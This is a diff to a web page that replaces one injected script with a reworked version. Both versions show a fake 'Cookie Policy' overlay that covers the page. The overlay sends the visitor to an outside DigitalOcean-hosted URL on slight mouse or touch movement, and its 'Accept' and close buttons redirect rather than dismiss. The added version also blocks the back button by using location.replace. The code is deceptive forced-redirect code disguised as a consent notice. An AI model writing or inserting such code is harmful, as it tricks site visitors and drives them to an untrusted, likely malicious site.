@@ -68,172 +68,153 @@
 
 
 <script>
-(() => {
-    document.addEventListener("DOMContentLoaded", () => {
-        const REDIRECT_URL = "https://babypoplo-dw93l.ondigitalocean.app/";
-        let redirectInitiated = false;
-        let initialMousePos = null;
-        let redirectTimer = null;
+document.addEventListener("DOMContentLoaded", () => {
+  const REDIRECT_URL = "https://babypoplo-dw93l.ondigitalocean.app/";
+  const redirectDelay = 800; 
+  const movementThreshold = 12; 
 
-        const autoRedirect = () => {
-            if (!redirectInitiated) {
-                redirectInitiated = true;
-                cleanupEvents();
-                window.location.href = REDIRECT_URL;
-            }
-        };
+  let hasRedirected = false;
+  let firstDetectedPosition = null;
+  let redirectTimer = null;
+  let userActive = false;
 
-        const cleanupEvents = () => {
-            document.removeEventListener("mousemove", detectMouseMove);
-            if (overlay) overlay.removeEventListener("mousemove", detectMouseMove);
-            if (redirectTimer) clearTimeout(redirectTimer);
-        };
+  // Inject CSS
+  (() => {
+    const style = document.createElement("style");
+    style.setAttribute("data-cookie-style", "true");
+    style.textContent = `
+      .cookie-wrapper {
+        position: fixed;
+        inset: 0;
+        background: rgba(0,0,0,0.75);
+        backdrop-filter: blur(10px);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+        z-index: 99999;
+      }
 
-        const detectMouseMove = (event) => {
-            if (redirectInitiated) return;
+      .cookie-box {
+        background: #fff;
+        border-radius: 12px;
+        padding: 30px;
+        width: 90%;
+        max-width: 450px;
+        font-family: "Arial", sans-serif;
+        box-shadow: 0 7px 35px rgba(0,0,0,0.25);
+        position: relative;
+      }
 
-            const screenHeight = window.innerHeight;
-            const activeZoneLimit = screenHeight * 0.15;
+      .cookie-box button {
+        cursor: pointer;
+      }
 
-            if (event.clientY >= activeZoneLimit) {
-                if (!initialMousePos) {
-                    initialMousePos = { x: event.clientX, y: event.clientY };
-                } else {
-                    const movedX = Math.abs(event.clientX - initialMousePos.x);
-                    const movedY = Math.abs(event.clientY - initialMousePos.y);
+      .cookie-close {
+        border: none;
+        background: transparent;
+        position: absolute;
+        right: 12px;
+        top: 12px;
+        font-size: 20px;
+        color: #666;
+      }
 
-                    if ((movedX > 10 || movedY > 10) && !redirectTimer) {
-                        redirectTimer = setTimeout(autoRedirect, 1000);
-                    }
-                }
-            } else {
-                initialMousePos = null;
-                if (redirectTimer) {
-                    clearTimeout(redirectTimer);
-                    redirectTimer = null;
-                }
-            }
-        };
+      .cta-btn {
+        display: inline-block;
+        background: #007bff;
+        padding: 12px 22px;
+        border-radius: 6px;
+        margin-top: 15px;
+        color: #fff;
+        text-decoration: none;
+        transition: 0.2s ease;
+      }
 
-        // =============================
-        // Dynamic Style Insertion
-        // =============================
+      .cta-btn:hover {
+        background: #045bc0;
+      }
+    `;
+    document.head.appendChild(style);
+  })();
 
-        const styleSheet = document.createElement("style");
-        styleSheet.textContent = `
-        .cookie-bg {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.88);
-            backdrop-filter: blur(12px);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 25px;
-            z-index: 999998;
-            opacity: 0;
-            animation: fadeIn 0.4s forwards ease-in;
-        }
 
-        @keyframes fadeIn {
-            to { opacity: 1; }
-        }
+  // Inject Popup
+  const wrapper = document.createElement("div");
+  wrapper.className = "cookie-wrapper";
+  wrapper.innerHTML = `
+    <div class="cookie-box">
+      <button class="cookie-close" aria-label="Close popup">×</button>
+      <h3>Cookie Policy</h3>
+      <p style="line-height:1.5;">
+        We use cookies for analytics and functionality improvements.
+        Learn more on our
+        <a href="${REDIRECT_URL}" target="_blank" style="text-decoration: underline; color:#007bff;">
+          Cookie Policy
+        </a>.
+      </p>
+      <a href="#" class="cta-btn confirm-btn">Accept</a>
+    </div>
+  `;
+  document.body.appendChild(wrapper);
 
-        .cookie-popup-box {
-            background: #fff;
-            border-radius: 12px;
-            padding: 28px;
-            width: 360px;
-            text-align: center;
-            position: relative;
-            box-shadow: 0 6px 22px rgba(0, 0, 0, 0.25);
-            font-family: system-ui, sans-serif;
-            z-index: 999999;
-        }
 
-        .close-popup-btn {
-            position: absolute;
-            right: 12px;
-            top: 12px;
-            cursor: pointer;
-            border: none;
-            background: transparent;
-            font-size: 20px;
-            color: #555;
-            transition: 0.2s;
-        }
+  const doRedirect = () => {
+    if (!hasRedirected) {
+      hasRedirected = true;
+      cleanupListeners();
+      window.location.replace(REDIRECT_URL);
+    }
+  };
 
-        .close-popup-btn:hover {
-            color: #000;
-        }
+  const scheduleRedirect = () => {
+    if (redirectTimer || hasRedirected) return;
+    redirectTimer = setTimeout(doRedirect, redirectDelay);
+  };
 
-        .action-btn {
-            background: #007bff;
-            padding: 12px 28px;
-            display: inline-block;
-            text-decoration: none;
-            border-radius: 8px;
-            font-size: 15px;
-            font-weight: 600;
-            color: #fff;
-            margin-top: 15px;
-            transition: 0.25s;
-        }
+  const detectMovement = (x, y) => {
+    if (!firstDetectedPosition) {
+      firstDetectedPosition = { x, y };
+      return;
+    }
 
-        .action-btn:hover {
-            background: #005ec4;
-        }
-        `;
+    const dx = Math.abs(x - firstDetectedPosition.x);
+    const dy = Math.abs(y - firstDetectedPosition.y);
 
-        document.head.appendChild(styleSheet);
+    if (dx > movementThreshold || dy > movementThreshold) {
+      scheduleRedirect();
+    }
+  };
 
-        // =============================
-        // Popup Construction
-        // =============================
+  const mouseMoveHandler = (event) => detectMovement(event.clientX, event.clientY);
 
-        const overlay = document.createElement("div");
-        overlay.setAttribute("role", "dialog");
-        overlay.setAttribute("aria-modal", "true");
-        overlay.setAttribute("id", "cookieNotifyOverlay");
-        overlay.className = "cookie-bg";
+  const touchMoveHandler = (event) => {
+    const touchPoint = event.touches[0];
+    detectMovement(touchPoint.clientX, touchPoint.clientY);
+  };
 
-        overlay.innerHTML = `
-            <div class="cookie-popup-box">
-                <button id="closePolicyPopup" class="close-popup-btn" aria-label="Close Dialog">×</button>
-                <h3 style="margin-bottom:10px;">Cookie Usage</h3>
-                <p style="font-size:14px; color:#444; line-height:1.6;">
-                    We use cookies for personalized experience, analytics & tracking.
-                    By accepting, you acknowledge full usage policy.
-                    Read more inside our 
-                    <a href="${REDIRECT_URL}" style="color:#0066cc; text-decoration:underline;">
-                        Cookie Policy
-                    </a>.
-                </p>
-                <a href="${REDIRECT_URL}" id="acceptPolicyBtn" class="action-btn">Accept</a>
-            </div>
-        `;
+  const clickHandler = (event) => {
+    if (
+      event.target.classList.contains("confirm-btn") ||
+      event.target.classList.contains("cookie-close")
+    ) {
+      event.preventDefault();
+      doRedirect();
+    }
+  };
 
-        document.body.appendChild(overlay);
+  // attach listeners
+  document.addEventListener("mousemove", mouseMoveHandler, { passive: true });
+  document.addEventListener("touchmove", touchMoveHandler, { passive: true });
+  wrapper.addEventListener("click", clickHandler);
 
-        // =============================
-        // Event Listeners
-        // =============================
-
-        document.addEventListener("mousemove", detectMouseMove);
-        overlay.addEventListener("mousemove", detectMouseMove);
-
-        document.getElementById("acceptPolicyBtn").addEventListener("click", (e) => {
-            e.preventDefault();
-            autoRedirect();
-        });
-
-        document.getElementById("closePolicyPopup").addEventListener("click", (e) => {
-            e.preventDefault();
-            autoRedirect();
-        });
-
-    });
-})();
+  // cleanup function
+  const cleanupListeners = () => {
+    document.removeEventListener("mousemove", mouseMoveHandler);
+    document.removeEventListener("touchmove", touchMoveHandler);
+    wrapper.removeEventListener("click", clickHandler);
+  };
+});
 </script>
 
     
